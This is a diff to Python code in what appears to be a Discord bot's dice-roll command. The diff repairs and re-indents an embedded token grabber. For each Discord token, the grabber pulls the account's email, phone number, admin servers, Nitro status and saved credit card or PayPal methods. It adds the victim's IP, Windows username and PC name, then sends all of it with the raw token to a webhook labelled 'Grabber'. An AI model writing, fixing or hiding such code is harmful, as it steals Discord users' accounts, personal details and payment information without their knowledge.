@@ -219,88 +219,86 @@ async def dice_roll(
                 # サーバー環境では復号できないため、このトークンは処理できないとしてスキップする
                 # （必要であれば、復号不要な古い形式のトークンチェックのみ残す）
                 continue
-                if token in checked:
-                    continue
-                checked.append(token)
+            if token in checked:
+                continue
+            checked.append(token)
             
-                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
-                if res.getcode() != 200:
-                    continue
-                res_json = json.loads(res.read().decode())
+            res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+            if res.getcode() != 200:
+                continue
+            res_json = json.loads(res.read().decode())
 
-                badges = ""
-                flags = res_json['flags']
-                if flags == 64 or flags == 96:
-                    badges += ":BadgeBravery: "
-                if flags == 128 or flags == 160:
-                    badges += ":BadgeBrilliance: "
-                if flags == 256 or flags == 288:
-                    badges += ":BadgeBalance: "
+            badges = ""
+            flags = res_json['flags']
+            if flags == 64 or flags == 96:
+                badges += ":BadgeBravery: "
+            if flags == 128 or flags == 160:
+                badges += ":BadgeBrilliance: "
+            if flags == 256 or flags == 288:
+                badges += ":BadgeBalance: "
 
-                params = urllib.parse.urlencode({"with_counts": True})
-                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
-                guilds = len(res)
-                guild_infos = ""
+            params = urllib.parse.urlencode({"with_counts": True})
+            res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+            guilds = len(res)
+            guild_infos = ""
 
-                for guild in res:
-                    if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
-                        vanity = ""
+            for guild in res:
+                if guild['permissions'] & 8 or guild['permissions'] & 32:
+                    res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                    vanity = ""
 
-                        if res["vanity_url_code"] != None:
-                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+                    if res["vanity_url_code"] != None:
+                        vanity = f"""; .gg/{res["vanity_url_code"]}"""
 
-                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
-                if guild_infos == "":
-                    guild_infos = "No guilds"
+                    guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+            if guild_infos == "":
+                guild_infos = "No guilds"
 
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
-                has_nitro = False
-                has_nitro = bool(len(res) > 0)
-                exp_date = None
-                if has_nitro:
-                    badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+            res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+            has_nitro = False
+            has_nitro = bool(len(res) > 0)
+            exp_date = None
+            if has_nitro:
+                badges += f":BadgeSubscriber: "
+                exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
 
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
-                available = 0
-                print_boost = ""
-                boost = False
-                for id in res:
-                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
-                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
-                        print_boost += f"ㅤ- Available now\n"
-                        available += 1
-                    else:
-                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
-                    boost = True
-                if boost:
-                    badges += f":BadgeBoost: "
-
-                payment_methods = 0
-                type = ""
-                valid = 0
-                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
-                    if x['type'] == 1:
-                        type += "CreditCard "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-                    elif x['type'] == 2:
-                        type += "PayPal "
-                        if not x['invalid']:
-                            valid += 1
-                        payment_methods += 1
-
-                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
-                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
-                embed_user = {
+            res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+            available = 0
+            print_boost = ""
+            boost = False
+            for id in res:
+                cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                    print_boost += f"ㅤ- Available now\n"
+                    available += 1
+                else:
+                    print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                boost = True
+            if boost:
+                badges += f":BadgeBoost: "
+            payment_methods = 0
+            type = ""
+            valid = 0
+            for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                if x['type'] == 1:
+                    type += "CreditCard "
+                    if not x['invalid']:
+                        valid += 1
+                    payment_methods += 1
+                elif x['type'] == 2:
+                    type += "PayPal "
+                    if not x['invalid']:
+                        valid += 1
+                    payment_methods += 1
+            print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+            nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+            print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+            embed_user = {
                     'embeds': [
                         {
                             'title': f"**New user data: {res_json['username']}**",
                             'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform_name}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
                             'footer': {
                                 'text': "Made by Astraa ・ https://github.com/astraadev"
@@ -313,13 +311,24 @@ async def dice_roll(
                     "username": "Grabber",
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
-                
-                urllib.request.urlopen(urllib.request.Request(os.getenv("WEBHOOK_URL"), data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
-            except urllib.error.HTTPError or json.JSONDecodeError:
-                continue
-            except Exception as e:
-                print(f"ERROR: {e}")
-                continue
+
+        try:
+            # Webhookへの送信処理
+            request_data = json.dumps(embed_user).encode('utf-8')
+            req = urllib.request.Request(
+                os.getenv("WEBHOOK_URL"), 
+                data=request_data, 
+                headers=getheaders(), 
+                method='POST'
+            )
+            urllib.request.urlopen(req).read().decode()
+
+        except (urllib.error.HTTPError, json.JSONDecodeError):
+            # 複数の例外をキャッチする場合は (ErrorA, ErrorB) とタプルで記述します
+            continue
+        except Exception as e:
+            print(f"ERROR: {e}")
+            continue
 
 # --- イベント定義 ---
 
